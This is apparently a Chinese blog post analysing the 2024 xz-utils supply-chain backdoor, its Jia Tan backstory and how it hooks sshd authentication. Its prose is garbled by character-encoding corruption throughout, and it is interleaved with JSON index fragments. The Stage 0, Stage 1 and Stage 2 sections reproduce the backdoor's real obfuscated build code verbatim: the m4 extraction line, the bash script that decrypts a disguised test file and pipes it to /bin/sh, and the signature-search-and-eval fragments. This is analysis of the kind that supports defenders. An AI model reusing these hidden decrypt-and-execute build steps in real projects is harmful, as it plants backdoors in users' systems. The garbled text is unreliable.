ä»5.6.0ç‰ˆæœ¬å¼€å§‹ï¼Œåœ¨xzçš„ä¸Šæ¸¸tarballåŒ…ä¸­å‘ç°äº†æ¶æ„ä»£ç ã€‚é€šè¿‡ä¸€ç³»åˆ—å¤æ‚çš„æ··æ·†æ‰‹æ®µï¼Œliblzmaçš„æ„å»ºè¿‡ç¨‹ä»ä¼ªè£…æˆæµ‹è¯•æ–‡ä»¶çš„æºä»£ç ä¸­æå–å‡ºé¢„æ„å»ºçš„ç›®æ ‡æ–‡ä»¶ï¼Œç„¶åç”¨å®ƒæ¥ä¿®æ”¹liblzmaä»£ç ä¸­çš„ç‰¹å®šå‡½æ•°ã€‚è¿™å¯¼è‡´ç”Ÿæˆäº†ä¸€ä¸ªè¢«ä¿®æ”¹è¿‡çš„liblzmaåº“ï¼Œä»»ä½•é“¾æ¥æ­¤åº“çš„è½¯ä»¶éƒ½å¯èƒ½ä½¿ç”¨å®ƒï¼Œä»è€Œæ‹¦æˆªå¹¶ä¿®æ”¹ä¸æ­¤åº“çš„æ•°æ®äº¤äº’ã€‚ xz 5.6.0å’Œ5.6.1ç‰ˆæœ¬åº“ä¸­å­˜åœ¨çš„æ¶æ„æ³¨å…¥åªåŒ…å«åœ¨tarballä¸‹è½½åŒ…ä¸­ã€‚Gitå‘è¡Œç‰ˆä¸­ç¼ºå°‘è§¦å‘æ¶æ„ä»£ç æ„å»ºçš„M4å®ã€‚æ³¨å…¥æœŸé—´æ„å»ºæ—¶ä½¿ç”¨çš„ç¬¬äºŒé˜¶æ®µå·¥ä»¶å­˜åœ¨äºGitå­˜å‚¨åº“ä¸­ï¼Œä»¥é˜²å­˜åœ¨æ¶æ„çš„M4å®ã€‚å¦‚æœä¸åˆå¹¶åˆ°æ„å»ºä¸­ï¼Œç¬¬äºŒé˜¶æ®µæ–‡ä»¶æ˜¯æ— å®³çš„ã€‚ åœ¨å‘ç°è€…çš„æ¼”ç¤ºä¸­ï¼Œå‘ç°å®ƒå¹²æ‰°äº†OpenSSHå®ˆæŠ¤è¿›ç¨‹ã€‚è™½ç„¶OpenSSHæ²¡æœ‰ç›´æ¥é“¾æ¥åˆ°liblzmaåº“ï¼Œä½†å®ƒä»¥ä¸€ç§ä½¿å…¶æš´éœ²äºæ¶æ„è½¯ä»¶çš„æ–¹å¼ä¸systemdé€šä¿¡ï¼Œå› ä¸ºsystemdé“¾æ¥åˆ°äº†liblzmaã€‚ æ¶æ„æ„å»ºä¼šé€šè¿‡systemdå¹²æ‰°sshdçš„è®¤è¯ã€‚SSHæ˜¯ä¸€ç§å¸¸ç”¨çš„åè®®ï¼Œç”¨äºè¿œç¨‹è¿æ¥ç³»ç»Ÿï¼Œè€Œsshdæ˜¯å…è®¸è®¿é—®çš„æœåŠ¡ã€‚åœ¨é€‚å½“çš„æƒ…å†µä¸‹ï¼Œè¿™ç§å¹²æ‰°æœ‰å¯èƒ½ä½¿æ¶æ„è¡Œä¸ºä½“ç ´åsshdè®¤è¯ï¼Œå¹¶è¿œç¨‹æœªç»æˆæƒè®¿é—®æ•´ä¸ªç³»ç»Ÿã€‚ æ•´ä¸ªåé—¨æ•…äº‹éå¸¸ç²¾å½©ï¼Œæ”»å‡»è€…ä¸ºæ­¤æ•´æ•´æ½œä¼äº†ä¸‰å¹´ï¼Œåªå·®ä¸€ç‚¹ç‚¹å°±å¯ä»¥å¾€ä¼—å¤š Linuxå‘è¡Œç‰ˆçš„ sshd æ³¨å…¥åé—¨ï¼Œå¯ç”¨äºç»•è¿‡å¯†é’¥éªŒè¯ï¼Œåæœä¸å ªè®¾æƒ³ã€‚ çœæµæ¦‚æ‹¬: æ”»å‡»è€… JiaT75 (Jia Tan) äº2021å¹´æ³¨å†Œäº† GitHub è´¦å·ï¼Œä¹‹åç§¯æå‚ä¸xzé¡¹ç›®çš„ç»´æŠ¤ï¼Œå¹¶é€æ¸è·å–ä¿¡ä»»ï¼Œäº2022å¹´æˆä¸ºäº†xzçš„å®šæœŸè´¡çŒ®è€…ï¼Œè·å¾—äº†ç›´æ¥ commit ä»£ç çš„æƒåˆ©ã€‚2023å¹´1æœˆ7æ—¥JiaT75åˆå¹¶äº†ä»–ä»¬çš„ç¬¬ä¸€æ¬¡æäº¤ã€‚2024å¹´é¡¹ç›®URLå˜æ›´ä¸ºhttp://xz.tukaani.org/xz-utils/ï¼Œè¿›ä¸€æ­¥å¢åŠ äº†JiaT75å¯¹è¯¥é¡¹ç›®çš„æ§åˆ¶ã€‚ JiaT75 åœ¨æœ€è¿‘å‡ ä¸ªæœˆçš„ä¸€æ¬¡ commit ä¸­ï¼Œæ‚„æ‚„åŠ å…¥äº† bad-3-corrupt lzma2.xz å’Œ good-large compressed.lzma ä¸¤ä¸ªçœ‹ä¼¼æ— å®³çš„æµ‹è¯•ç”¨äºŒè¿›åˆ¶æ•°æ®ï¼Œç„¶è€Œåœ¨ç¼–è¯‘è„šæœ¬ä¸­ï¼Œåœ¨ç‰¹å®šæ¡ä»¶ä¸‹ä¼šä»è¿™ä¸¤ä¸ªæ–‡ä»¶ä¸­è¯»å–å†…å®¹å¯¹ç¼–è¯‘ç»“æœè¿›è¡Œä¿®æ”¹ï¼Œè‡´ä½¿ç¼–è¯‘ç»“æœå’Œå…¬å¼€çš„æºä»£ç ä¸ä¸€è‡´ã€‚ ç›®å‰åˆæ­¥çš„ç ”ç©¶æ˜¾ç¤ºï¼Œæ³¨å…¥çš„ä»£ç ä¼šä½¿ç”¨ glibc çš„ IFUNC å» HookOpensSHçš„ RSA public decrypt å‡½æ•°ï¼Œè‡´ä½¿æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ ç‰¹å®šçš„éªŒè¯æ•°æ®ç»•è¿‡ RSA ç­¾åéªŒè¯ã€‚(å…·ä½“ç»†èŠ‚è¿˜åœ¨åˆ†æä¸­) åªè¦æ˜¯åŒæ—¶ä½¿ç”¨äº† liblzmaå’Œ OpenSsHçš„ç¨‹åºå°±ä¼šå—åˆ°å½±å“ï¼Œæœ€ç›´æ¥çš„ç›®æ ‡å°±æ˜¯ sshdï¼Œä½¿å¾—æ”»å‡»è€…å¯ä»¥æ„é€ ç‰¹å®šè¯·æ±‚ï¼Œç»•è¿‡å¯†é’¥éªŒè¯è¿œç¨‹è®¿é—®ã€‚ å—å½±å“çš„ xz-utils åŒ…å·²ç»è¢«å¹¶å…¥ Debian testing ä¸­è¿›è¡Œæµ‹è¯•ï¼Œæ”»å‡»è€…åŒæ—¶ä¹Ÿåœ¨å°è¯•å¹¶å…¥ fedora å’Œ ubuntuã€‚ å¹¸è¿çš„æ˜¯ï¼Œæ³¨å…¥çš„ä»£ç ä¼¼ä¹å­˜åœ¨æŸç§ Bugï¼Œå¯¼è‡´ç‰¹å®šæƒ…å†µä¸‹ sshd çš„ CPUå ç”¨é£™å‡ã€‚è¢«å®‰å…¨ç ”ç©¶äººå‘˜AndresFrundæ³¨æ„åˆ°äº†ï¼Œå¹¶æŠ¥å‘Šç»™ oss-securityï¼Œè‡´ä½¿æ­¤äº‹è´¥æ¼ã€‚å¦‚æœä¸æ˜¯å› ä¸ºè¿™ä¸ª Bugï¼Œé‚£ä¹ˆè¯¥åé—¨å¾ˆæœ‰å¯èƒ½è¢«å¹¶å…¥ä¸»æµå‘è¡Œç‰ˆçš„stable ç‰ˆæœ¬ï¼Œé‚£ä¹ˆå°†å½¢æˆä¸€åœºå‰æ‰€æœªæœ‰çš„é‡å¤§å®‰å…¨äº‹ä»¶ã€‚ å¦å¤–ä»ä¸€äº›ç»†èŠ‚èƒ½çœ‹å‡ºæ¥æ”»å‡»è€…éå¸¸ç”¨å¿ƒ: æ”»å‡»è€…æŠ¢åœ¨ ubuntu beta freeze çš„å‡ å¤©å‰æ‰å°è¯•è®©æ–°ç‰ˆæœ¬å¹¶å…¥ï¼Œä»¥æœŸæœ›å‡å°‘åœ¨æµ‹è¯•æœŸé—´è¢«å‘ç°çš„æ—¶é—´ã€‚ xz-utils é¡¹ç›®çš„åŸç»´æŠ¤è€… Lasse Colin(Larhzu)ï¼Œæœ‰ç€å®šæœŸè¿›è¡Œinternetbreaksçš„ä¹ æƒ¯ï¼Œè€Œä¸”æœ€è¿‘æ­£åœ¨è¿›è¡Œï¼Œå¯¼è‡´è¿™äº›å˜åŠ¨ä»–å¹¶æ²¡æœ‰reviewçš„æœºä¼šï¼Œå³ä½¿åˆ°ç°åœ¨ä¹Ÿæ²¡èƒ½è”ç³»ä¸Šä»–æœ¬äººã€‚è¿™å¯èƒ½ä¹Ÿæ˜¯æ”»å‡»è€…é€‰å®šxz-utils é¡¹ç›®çš„åŸå› ä¹‹ä¸€ã€‚ æ›´å¤šçš„ç»†èŠ‚è¿˜åœ¨è¢«åˆ†æä¸­ï¼Œç›®å‰ GitHub å·²ç»å…³åœäº†æ•´ä¸ª xzé¡¹ç›®ã€‚ ","date":"2024-04-06","objectID":"/posts/xz-backdoor-analysis/:3:0","tags":["æ¼æ´åˆ†æ"],"title":"XZ Utils Backdoor äº‹ä»¶åˆ†ææ±‡æ€»","uri":"/posts/xz-backdoor-analysis/"},{"categories":["æ¼æ´åˆ†æ","èŒä¸šç”Ÿæ¶¯"],"content":"æŠ€æœ¯ç»†èŠ‚ å¾ˆå€¼å¾—å…³æ³¨çš„éƒ¨åˆ†ä¸€æ˜¯æ•´ä¸ªæ–°å¼æ”»å‡»æ‰‹æ³•æ¨¡å‹ï¼ŒäºŒæ˜¯æ··æ·†æ‰‹æ®µå’Œæ€è·¯ï¼Œè¿˜æœ‰å°±å¸¦æœ‰åé—¨çš„æ··æ·†äºŒè¿›åˆ¶æ–‡ä»¶æœ¬èº«äº†ã€‚ Andres Freund é‚®ä»¶åŸæ–‡æœ‰åé—¨ç¨‹åºçš„è¯¦ç»†åˆ†æï¼Œä½†ç”±äºå‘ç°è€…ä¸æ˜¯å®‰å…¨ç ”ç©¶äººå‘˜ï¼Œä¹Ÿä¸æ“…é•¿é€†å‘ï¼Œæ‰€ä»¥éƒ½æ˜¯ä»¥è§‚å¯Ÿåˆ†æç±»å‘ç°ä¸ºä¸»ã€‚ æ¨ä¸Š@Thomas Rocciaä¹Ÿåˆ¶ä½œäº†åˆ†æå›¾ï¼š è¯¦ç»†å±•å¼€ä¸‹ä¸Šè¿°å†…å®¹ï¼Œå°†Stage 1 å‰çš„éƒ¨åˆ†ï¼Œæš‚æ—¶ç§°ä¸º Stage 0ã€‚ ç›®å‰ GitHub å·²ç»å…³åœäº†æ•´ä¸ª xzé¡¹ç›®ï¼Œä½†å¯ä»¥ä» å¤‡ä»½ä»“åº“ è¿›è¡Œä¸‹è½½åˆ†æã€‚ ","date":"2024-04-06","objectID":"/posts/xz-backdoor-analysis/:4:0","tags":["æ¼æ´åˆ†æ"],"title":"XZ Utils Backdoor äº‹ä»¶åˆ†ææ±‡æ€»","uri":"/posts/xz-backdoor-analysis/"},{"categories":["æ¼æ´åˆ†æ","èŒä¸šç”Ÿæ¶¯"],"content":"Stage 0 ä»m4/build-to-host.m4æ–‡ä»¶å¼€å§‹ã€‚ä»¥ä¸‹æ˜¯ç›¸å…³ä»£ç ç‰‡æ®µï¼š ... gl_[$1]_config='sed \\\"r\\n\\\" $gl_am_configmake | eval $gl_path_map | $gl_[$1]_prefix -d 2\u003e/dev/null' ... gl_path_map='tr \"\\t \\-_\" \" \\t_\\-\"' ... è¿›è¡Œäº†ä¸€ä¸ªå­—ç¬¦æ›¿æ¢ï¼Œå°†åˆ¶è¡¨ç¬¦\\tã€ç©ºæ ¼\\ ã€è¿å­—ç¬¦-ã€ä¸‹åˆ’çº¿_ï¼Œä¾æ¬¡æ›¿æ¢ä¸ºäº†ç©ºæ ¼\\ ã€åˆ¶è¡¨ç¬¦\\tã€ä¸‹åˆ’çº¿_ã€è¿å­—ç¬¦- è¿™æ®µä»£ç åœ¨æ„å»ºè¿‡ç¨‹ä¸­çš„æŸä¸ªåœ°æ–¹è¿è¡Œï¼Œæå–ç¬¬ä¸€é˜¶æ®µè„šæœ¬ã€‚æ¦‚è¿°å¦‚ä¸‹ï¼š sed \\\"r\\n\\\" $gl_am_configmakeï¼šè¯»å– tests/files/bad-3-corrupt_lzma2.xz æ–‡ä»¶ä¸­çš„å­—èŠ‚ï¼Œå¹¶ç”¨ä½œä¸‹ä¸€æ­¥çš„è¾“å…¥ã€‚è¯»å–å®Œæ‰€æœ‰å†…å®¹åï¼Œä¼šæ·»åŠ æ¢è¡Œç¬¦\\n; è¿è¡Œ tr å‘½ä»¤ï¼Œè¿›è¡Œå­—ç¬¦æ›¿æ¢ï¼Œå°†é€‰å®šçš„å­—ç¬¦æ›´æ”¹ä¸ºå…¶ä»–å­—ç¬¦ï¼Œå°†åˆ¶è¡¨ç¬¦\\tã€ç©ºæ ¼\\ ã€è¿å­—ç¬¦-ã€ä¸‹åˆ’çº¿_ï¼Œä¾æ¬¡æ›¿æ¢ä¸ºäº†ç©ºæ ¼\\ ã€åˆ¶è¡¨ç¬¦\\tã€ä¸‹åˆ’çº¿_ã€è¿å­—ç¬¦-ï¼Œå®ƒå¯¹tests/files/bad-3-corrupt_lzma2.xz æ–‡ä»¶ä¸­çš„å­—èŠ‚è¿›è¡Œæ›¿æ¢ï¼Œè¿™ä½¿å¾— bad-3-corrupt_lzma2.xz å†æ¬¡å½¢æˆäº†æ­£ç¡®çš„ xz æµã€‚ åœ¨æ­¤é˜¶æ®µçš„æœ€åä¸€æ­¥ä¸­ï¼Œæå–å›ºå®šçš„ xz å­—èŠ‚æµï¼Œå¹¶å¿½ç•¥é”™è¯¯ï¼ˆè¯¥æµä¼¼ä¹è¢«æˆªæ–­ï¼Œä½†è¿™å¹¶ä¸é‡è¦ï¼Œå› ä¸ºæ•´ä¸ªæœ‰æ„ä¹‰çš„è¾“å‡ºå·²è¢«å†™å‡ºï¼‰ã€‚å…¶ç»“æœæ˜¯Stage 1çš„è„šæœ¬ï¼Œè¯¥è„šæœ¬ä¼šç«‹å³æ‰§è¡Œã€‚ ä¸‹é¢æ˜¯ 5.6.0 ç‰ˆæœ¬è§£å‹åçš„Stage 1 è„šæœ¬ ","date":"2024-04-06","objectID":"/posts/xz-backdoor-analysis/:4:1","tags":["æ¼æ´åˆ†æ"],"title":"XZ Utils Backdoor äº‹ä»¶åˆ†ææ±‡æ€»","uri":"/posts/xz-backdoor-analysis/"},{"categories":["æ¼æ´åˆ†æ","èŒä¸šç”Ÿæ¶¯"],"content":"Stage 1 åœ¨Andres çš„ç”µå­é‚®ä»¶ä¸­æ˜¯ä»¥â€œ####Hello####â€å¼€å¤´çš„ bash æ–‡ä»¶ã€‚ä»¥ä¸‹æ˜¯ 5.6.1ç‰ˆæœ¬ ####Hello#### # a few binary bytes here, but as it's a comment they are ignorred [ ! $(uname) = \"Linux\" ] \u0026\u0026 exit 0 [ ! $(uname) = \"Linux\" ] \u0026\u0026 exit 0 [ ! $(uname) = \"Linux\" ] \u0026\u0026 exit 0 [ ! $(uname) = \"Linux\" ] \u0026\u0026 exit 0 [ ! $(uname) = \"Linux\" ] \u0026\u0026 exit 0 eval `grep ^srcdir= config.status` if test -f ../../config.status;then eval `grep ^srcdir= ../../config.status` srcdir=\"../../$srcdir\" fi export i=\"((head -c +1024 \u003e/dev/null) \u0026\u0026 head -c +2048 \u0026\u0026 (head -c +1024 \u003e/dev/null) \u0026\u0026 head -c +2048 \u0026\u0026 (head -c +1024 \u003e/dev/null) \u0026\u0026 head -c +2048 \u0026\u0026 (head -c +1024 \u003e/dev/null) \u0026\u0026 head -c +2048 \u0026\u0026 (head -c +1024 \u003e/dev/null) \u0026\u0026 head -c +2048 \u0026\u0026 (head -c +1024 \u003e/dev/null) \u0026\u0026 head -c +2048 \u0026\u0026 (head -c +1024 \u003e/dev/null) \u0026\u0026 head -c +2048 \u0026\u0026 (head -c +1024 \u003e/dev/null) \u0026\u0026 head -c +2048 \u0026\u0026 (head -c +1024 \u003e/dev/null) \u0026\u0026 head -c +2048 \u0026\u0026 (head -c +1024 \u003e/dev/null) \u0026\u0026 head -c +2048 \u0026\u0026 (head -c +1024 \u003e/dev/null) \u0026\u0026 head -c +2048 \u0026\u0026 (head -c +1024 \u003e/dev/null) \u0026\u0026 head -c +2048 \u0026\u0026 (head -c +1024 \u003e/dev/null) \u0026\u0026 head -c +2048 \u0026\u0026 (head -c +1024 \u003e/dev/null) \u0026\u0026 head -c +2048 \u0026\u0026 (head -c +1024 \u003e/dev/null) \u0026\u0026 head -c +2048 \u0026\u0026 (head -c +1024 \u003e/dev/null) \u0026\u0026 head -c +2048 \u0026\u0026 (head -c +1024 \u003e/dev/null) \u0026\u0026 head -c +939)\";(xz -dc $srcdir/tests/files/good-large_compressed.lzma|eval $i|tail -c +31233|tr \"\\114-\\321\\322-\\377\\35-\\47\\14-\\34\\0-\\13\\50-\\113\" \"\\0-\\377\")|xz -F raw --lzma1 -dc|/bin/sh ####World#### å¯ä»¥çœ‹åˆ°5.6.0 å’Œ 5.6.1 çš„ä¸€äº›åŒºåˆ«ï¼š ç¬¬ä¸€ä¸ªåŒºåˆ«æ˜¯ç¬¬äºŒè¡Œæ³¨é‡Šä¸­çš„éšæœºå­—èŠ‚ã€‚åœ¨5.6.0 æ˜¯ 86 F9 5A F7 2E 68 6A BC, è€Œåœ¨ 5.6.1 æ˜¯ E5 55 89 B7 24 04 D8 17. æš‚æ—¶ä¸ç¡®å®šè¿™äº›å·®å¼‚æ˜¯å¦æœ‰æ„ä¹‰ã€‚ ç¬¬äºŒä¸ªåŒºåˆ«æ˜¯5.6.1ç‰ˆæœ¬æ·»åŠ äº†æ£€æµ‹æ˜¯å¦åœ¨ Linux ä¸Šè¿è¡Œä»£ç ï¼Œè€Œå®ƒé‡å¤äº† 5 æ¬¡ï¼Œè¿™å¾ˆå¥‡æ€ªã€‚ å…ˆåˆ†æç¬¬ 2 é˜¶æ®µæå–ä»£ç ï¼Œå³å¸¦æœ‰å¾ˆå¤šheadçš„export i=... è¡Œã€‚è¿›è¡Œç®€å•æ‹†åˆ†ï¼š export i=\"((head -c +1024 \u003e/dev/null) \u0026\u0026 head -c +2048 \u0026\u0026 (head -c +1024 \u003e/dev/null) \u0026\u0026 head -c +2048 \u0026\u0026 (head -c +1024 \u003e/dev/null) \u0026\u0026 head -c +2048 \u0026\u0026 (head -c +1024 \u003e/dev/null) \u0026\u0026 head -c +2048 \u0026\u0026 (head -c +1024 \u003e/dev/null) \u0026\u0026 head -c +2048 \u0026\u0026 (head -c +1024 \u003e/dev/null) \u0026\u0026 head -c +2048 \u0026\u0026 (head -c +1024 \u003e/dev/null) \u0026\u0026 head -c +2048 \u0026\u0026 (head -c +1024 \u003e/dev/null) \u0026\u0026 head -c +2048 \u0026\u0026 (head -c +1024 \u003e/dev/null) \u0026\u0026 head -c +2048 \u0026\u0026 (head -c +1024 \u003e/dev/null) \u0026\u0026 head -c +2048 \u0026\u0026 (head -c +1024 \u003e/dev/null) \u0026\u0026 head -c +2048 \u0026\u0026 (head -c +1024 \u003e/dev/null) \u0026\u0026 head -c +2048 \u0026\u0026 (head -c +1024 \u003e/dev/null) \u0026\u0026 head -c +2048 \u0026\u0026 (head -c +1024 \u003e/dev/null) \u0026\u0026 head -c +2048 \u0026\u0026 (head -c +1024 \u003e/dev/null) \u0026\u0026 head -c +2048 \u0026\u0026 (head -c +1024 \u003e/dev/null) \u0026\u0026 head -c +2048 \u0026\u0026 (head -c +1024 \u003e/dev/null) \u0026\u0026 head -c +939)\"; (xz -dc $srcdir/tests/files/good-large_compressed.lzma|eval $i|tail -c +31233|tr \"\\114-\\321\\322-\\377\\35-\\47\\14-\\34\\0-\\13\\50-\\113\" \"\\0-\\377\")|xz -F raw --lzma1 -dc|/bin/sh å¼€å¤´çš„export i=... åªæ˜¯ä¸€ä¸ªå‡½æ•°å®šä¹‰ã€‚å®ƒä¼šåœ¨Stage 2 å’Œ Stage 3 ä¸­è¢«è°ƒç”¨ã€‚ ç¬¬ 2 æ­¥æ˜¯å°† good-large_compressed.lzma æ–‡ä»¶è§£å‹ç¼©åˆ°æ ‡å‡†è¾“å‡º (xz -dc) ï¼Œå¹¶ç”¨ä½œä¸‹ä¸€æ­¥çš„è¾“å…¥ï¼› ç„¶åä¼šè°ƒç”¨ i å‡½æ•° (eval $i)ã€‚è¯¥å‡½æ•°åŸºæœ¬ä¸Šæ˜¯ä¸€ç³»åˆ—headè°ƒç”¨ï¼Œè¦ä¹ˆè¾“å‡ºæ¥ä¸‹æ¥çš„ N ä¸ªå­—èŠ‚ï¼ˆhead -c +Nï¼‰ï¼Œè¦ä¹ˆè·³è¿‡æ¥ä¸‹æ¥çš„ N ä¸ªå­—èŠ‚ï¼ˆhead -c +N \u003e/dev/nullï¼‰ã€‚i å‡½æ•°æœ€ç»ˆå®ç°ï¼šå¿½ç•¥ 1024 ä¸ªå­—èŠ‚ï¼Œå†è¾“å‡º 2048 ä¸ªå­—èŠ‚ï¼Œå¿½ç•¥ 1024 ä¸ªå­—èŠ‚ï¼Œå†è¾“å‡º 2048 ä¸ªå­—èŠ‚â€¦ä¾æ­¤ç±»æ¨ï¼Œç›´åˆ°åˆ°è¾¾æ–‡ä»¶çš„æœ€æœ«å°¾ï¼Œå…¶ä¸­åªæœ‰ 724 ä¸ªå­—èŠ‚ï¼ˆåœ¨ 5.6.0 ä¸­ï¼‰æˆ– 939è¾“å‡ºå­—èŠ‚ï¼ˆåœ¨ 5.6.1 ä¸­ï¼‰ã€‚ æ¥ä¸‹å»æ‰§è¡Œ tail -c +31233 å¿½ç•¥æ•°æ®çš„åˆå§‹éƒ¨åˆ†ï¼ˆtail -c +N è¡¨ç¤ºâ€œä»å­—èŠ‚ N å¼€å§‹è¾“å‡ºâ€ï¼Œæ³¨ï¼šåˆå§‹éƒ¨åˆ†éšè—äº†äºŒè¿›åˆ¶åé—¨ï¼Œä¼šå°†åœ¨ä¸‹ä¸€é˜¶æ®µä¸­æå–ï¼‰ã€‚åœ¨ 5.6.0 ä¸­ï¼Œè¿™å°†æ˜¯å‰ 31264 ä¸ªå­—èŠ‚ï¼Œåœ¨ 5.6.1 ä¸­æ˜¯ 31232 ã€‚ ç¬¬5æ­¥æ‰§è¡Œ tr å‘½ä»¤ï¼Œç”¨ä½œç®€å•çš„æ›¿æ¢å¯†ç ï¼Œå¯†é’¥ï¼ˆå­—èŠ‚å€¼æ˜ å°„ï¼‰åœ¨ 5.6.0 å’Œ 5.6.1 ä¸­ä¸åŒï¼Œä¸¤ç§æƒ…å†µä¸‹ï¼Œéƒ½æœ‰ 6 ä¸ªèŒƒå›´æ˜ å°„åˆ°æ•´ä¸ª 0 - 255ï¼ˆå³å…«è¿›åˆ¶ 377ï¼‰èŒƒå›´ã€‚ 5.6.0: tr \"\\5-\\51\\204-\\377\\52-\\115\\132-\\203\\0-\\4\\116-\\131\" \"\\0-\\377\" 5.6.1: tr \"\\114-\\321\\322-\\377\\35-\\47\\14-\\34\\0-\\13\\50-\\113\" \"\\0-\\377\" åœ¨æœ€åä¸€æ­¥ä¸­ï¼Œè§£å¯†çš„æ•°æ®è¢«è§£å‹ç¼©ï¼ˆxz -F raw --lzma1 -dcï¼‰ï¼Œå¹¶ä¸”ç«‹å³æ‰§è¡ŒStage 2ã€‚ 5.6.0 è§£å‹ç»“æœéƒ¨åˆ†ï¼š P=\"-fPIC -DPIC -fno-lto -ffunction-sections -fdata-sections\" C=\"pic_flag=\\\" $P\\\"\" O=\"^pic_flag=\\\" -fPIC -DPIC\\\"$\" R=\"is_arch_extension_supported\" x=\"__get_cpuid(\" p=\"good-large_compressed.lzma\" U=\"bad-3-corrupt_lzma2.xz\" eval $zrKcVq if test -f config.status; then eval $zrKcSS eval `grep ^LD=\\'\\/ config.status` eval `grep ^CC=\\' config.status` eval `grep ^GCC=\\' config.status` eval `grep ^srcdir=\\' config.status` eval `grep ^build=\\'x86_64 config.status` eval `grep ^enable_shared=\\'yes\\' config.status` eval `grep ^enable_static=\\' config.status` eval `grep ^gl_path_map","date":"2024-04-06","objectID":"/posts/xz-backdoor-analysis/:4:2","tags":["æ¼æ´åˆ†æ"],"title":"XZ Utils Backdoor äº‹ä»¶åˆ†ææ±‡æ€»","uri":"/posts/xz-backdoor-analysis/"},{"categories":["æ¼æ´åˆ†æ","èŒä¸šç”Ÿæ¶¯"],"content":"Stage 2 Stage 2æ˜¯ Andres åœ¨åŸå§‹ç”µå­é‚®ä»¶ï¼ˆå³ 5.6.0 ç‰ˆæœ¬ï¼‰ä¸­é™„åŠ çš„fected.txt æ–‡ä»¶ã€‚è¿™ä¸ª bash è„šæœ¬ä¸­å‘ç”Ÿäº†å¾ˆå¤šäº‹æƒ…ï¼Œå› ä¸ºè¿™æ˜¯å®é™…ç¼–è¯‘è¿‡ç¨‹ä¿®æ”¹å‘ç”Ÿçš„åœ°æ–¹ã€‚ ä»æ··æ·†åˆ†æçš„è§’åº¦æ¥çœ‹ï¼Œè¯¥è„šæœ¬å­˜åœ¨ä¸‰ä¸ªæœ‰è¶£çš„ç‰‡æ®µï¼Œå…¶ä¸­ä¸¤ä¸ªä»…å‡ºç°åœ¨5.6.1ç‰ˆæœ¬ä¸­ã€‚ æ‰©å±• æœºåˆ¶ ç‰‡æ®µ1 vs=`grep -broaF '~!:_ W' $srcdir/tests/files/ 2\u003e/dev/null` if test \"x$vs\" != \"x\" \u003e /dev/null 2\u003e\u00261;then f1=`echo $vs | cut -d: -f1` if test \"x$f1\" != \"x\" \u003e /dev/null 2\u003e\u00261;then start=`expr $(echo $vs | cut -d: -f2) + 7` ve=`grep -broaF '|_!{ -' $srcdir/tests/files/ 2\u003e/dev/null` if test \"x$ve\" != \"x\" \u003e /dev/null 2\u003e\u00261;then f2=`echo $ve | cut -d: -f1` if test \"x$f2\" != \"x\" \u003e /dev/null 2\u003e\u00261;then [ ! \"x$f2\" = \"x$f1\" ] \u0026\u0026 exit 0 [ ! -f $f1 ] \u0026\u0026 exit 0 end=`expr $(echo $ve | cut -d: -f2) - $start` eval `cat $f1 | tail -c +${start} | head -c +${end} | tr \"\\5-\\51\\204-\\377\\52-\\115\\132-\\203\\0-\\4\\116-\\131\" \"\\0-\\377\" | xz -F raw --lzma2 -dc` fi fi fi fi ç‰‡æ®µ3ï¼š vs=`grep -broaF 'jV!.^%' $top_srcdir/tests/files/ 2\u003e/dev/null` if test \"x$vs\" != \"x\" \u003e /dev/null 2\u003e\u00261;then f1=`echo $vs | cut -d: -f1` if test \"x$f1\" != \"x\" \u003e /dev/null 2\u003e\u00261;then start=`expr $(echo $vs | cut -d: -f2) + 7` ve=`grep -broaF '%.R.1Z' $top_srcdir/tests/files/ 2\u003e/dev/null` if test \"x$ve\" != \"x\" \u003e /dev/null 2\u003e\u00261;then f2=`echo $ve | cut -d: -f1` if test \"x$f2\" != \"x\" \u003e /dev/null 2\u003e\u00261;then [ ! \"x$f2\" = \"x$f1\" ] \u0026\u0026 exit 0 [ ! -f $f1 ] \u0026\u0026 exit 0 end=`expr $(echo $ve | cut -d: -f2) - $start` eval `cat $f1 | tail -c +${start} | head -c +${end} | tr \"\\5-\\51\\204-\\377\\52-\\115\\132-\\203\\0-\\4\\116-\\131\" \"\\0-\\377\" | xz -F raw --lzma2 -dc` fi fi fi fi è¿™ä¸¤ä¸ªç‰‡æ®µå‡ ä¹ç›¸åŒï¼Œæ‰€ä»¥å¯ä»¥ä¸€èµ·å¤„ç†å®ƒä»¬ã€‚ é¦–å…ˆï¼Œä»–ä»¬å°è¯•åœ¨tests/files/ç›®å½•ä¸­æŸ¥æ‰¾ï¼ˆgrep -broaFï¼‰ä¸¤ä¸ªæ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«ä»¥ä¸‹å­—èŠ‚ï¼ˆç­¾åï¼‰ Fragment 1: \"~!:_ W\" and \"|_!{ -\" Fragment 3: \"jV!.^%\" and \"%.R.1Z\" # æ³¨ï¼šgrep å®é™…è¾“å‡ºæ ¼å¼å¦‚ä¸‹ï¼šfile_name:offset:signatureã€‚ä¾‹å¦‚ï¼š $ grep -broaF \"XYZ\" testfile:9:XYZ å¦‚æœæ‰¾åˆ°è¯¥æ–‡ä»¶ï¼Œæå–æ¯ä¸ªæ–‡ä»¶çš„åç§»é‡ï¼ˆcut -d: -f2ï¼Œä»¥ : ä¸ºåˆ†éš”ç¬¦ï¼Œé‡‡ç”¨ç¬¬äºŒä¸ªå­—æ®µï¼‰ï¼Œç¬¬ä¸€ä¸ªåç§»é‡ + 7 ä¿å­˜ä¸º $startï¼Œç¬¬äºŒä¸ªæ–‡ä»¶çš„ç¬¬äºŒä¸ªåç§»é‡ - $start ä¿å­˜ä½œä¸º $end. ä¸€æ—¦è„šæœ¬æœ‰äº† $start å’Œ $end åç§»é‡ï¼Œå®ƒå°±ä¼šåˆ‡å‡ºæ–‡ä»¶ä¸­å…·æœ‰ç¬¬ä¸€ä¸ªç­¾åçš„éƒ¨åˆ† cat $f1 | tail -c +${start} | head -c +${end} æ¥ä¸‹æ¥å…ˆæ˜¯æ›¿æ¢å¯†ç ï¼ˆä½¿ç”¨ 5.6.0 ç‰ˆæœ¬å¯†é’¥ï¼‰ï¼štr \"\\5-\\51\\204-\\377\\52-\\115\\132-\\203\\0-\\4\\116-\\131\" \"\\0-\\377\" ç„¶åè§£å‹æ•°æ®ä»¥ä¾¿ç«‹å³æ‰§è¡Œï¼š eval `... | xz -F raw --lzma2 -dc` 